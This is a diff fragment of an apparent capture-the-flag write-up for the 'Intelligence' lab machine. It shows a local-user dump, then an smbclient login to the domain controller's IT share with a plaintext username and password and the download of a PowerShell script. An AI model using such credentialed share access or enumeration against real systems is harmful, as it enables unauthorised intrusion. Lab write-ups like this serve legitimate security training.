@@ -421,3 +421,19 @@ SMB         10.129.95.154   445    DC               [*] Enumerated 41 local user
 SMB         10.129.95.154   445    DC               [*] Writing 41 local users to users.txt
 ```
 Dumped all the users
+
+# IT share
+```python
+smbclient //dc.intelligence.htb/IT -U 'tiffany.molina'%'NewIntelligenceCorpUser9876'                              
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Mon Apr 19 01:50:55 2021
+  ..                                  D        0  Mon Apr 19 01:50:55 2021
+  downdetector.ps1                    A     1046  Mon Apr 19 01:50:55 2021
+
+		3770367 blocks of size 4096. 1451522 blocks available
+smb: \> get downdetector.ps1 
+getting file \downdetector.ps1 of size 1046 as downdetector.ps1 (17.9 KiloBytes/sec) (average 17.9 KiloBytes/sec)
+smb: \> 
+```
+Found a powershell script
